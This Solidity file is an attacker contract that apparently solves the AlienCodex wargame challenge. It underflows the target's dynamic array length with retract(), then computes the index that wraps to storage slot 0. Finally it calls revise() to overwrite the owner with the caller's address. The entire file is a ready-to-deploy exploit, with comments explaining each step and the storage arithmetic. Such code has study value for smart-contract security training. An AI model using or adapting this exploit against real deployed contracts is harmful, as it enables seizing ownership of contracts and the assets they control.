// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AliencodexAttacker
 * @notice Exploits array underflow vulnerability in AlienCodex contract to claim ownership
 * @dev Targets Solidity 0.5.0 contract with unchecked array length decrement
 */

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
}

contract AliencodexAttacker {
    IAlienCodex public target;

    event ContactMade();
    event ArrayUnderflowed();
    event OwnershipClaimed(address newOwner);

    constructor(address _target) {
        require(_target != address(0), "Invalid target address");
        target = IAlienCodex(_target);
    }

    /**
     * @notice Executes the complete attack sequence
     * @dev Steps:
     *   1. Call makeContact() to satisfy the contacted() modifier
     *   2. Call retract() to underflow array length from 0 to 2^256-1
     *   3. Calculate storage slot 0 index via array wrapping
     *   4. Call revise() to overwrite owner at slot 0
     */
    function attack() external {
        // Step 1: Enable contact
        target.makeContact();
        emit ContactMade();

        // Step 2: Underflow array length
        target.retract();
        emit ArrayUnderflowed();

        // Step 3: Calculate storage slot 0 index
        // Dynamic arrays store data starting at keccak256(slot)
        // For codex at slot 1: data starts at keccak256(1)
        uint256 arrayStart = uint256(keccak256(abi.encode(uint256(1))));

        // To reach slot 0, we need to wrap around:
        // slot 0 = (arrayStart + targetIndex) % 2^256
        // Therefore: targetIndex = 2^256 - arrayStart
        uint256 targetIndex;
        unchecked {
            targetIndex = type(uint256).max - arrayStart + 1;
        }

        // Step 4: Overwrite owner at slot 0
        // Slot 0 contains: owner (address - 20 bytes) + contact (bool - 1 byte)
        // We write 32 bytes, so we'll overwrite the entire slot
        bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));
        target.revise(targetIndex, newOwner);

        emit OwnershipClaimed(msg.sender);
    }

    /**
     * @notice Verifies if attack was successful
     * @return Current owner of target contract
     */
    function verifyOwnership() external view returns (address) {
        return target.owner();
    }

    /**
     * @notice Gets the calculated index that points to slot 0
     * @return Index value for exploiting the underflowed array
     */
    function getTargetIndex() external pure returns (uint256) {
        uint256 arrayStart = uint256(keccak256(abi.encode(uint256(1))));
        uint256 targetIndex;
        unchecked {
            targetIndex = type(uint256).max - arrayStart + 1;
        }
        return targetIndex;
    }
}
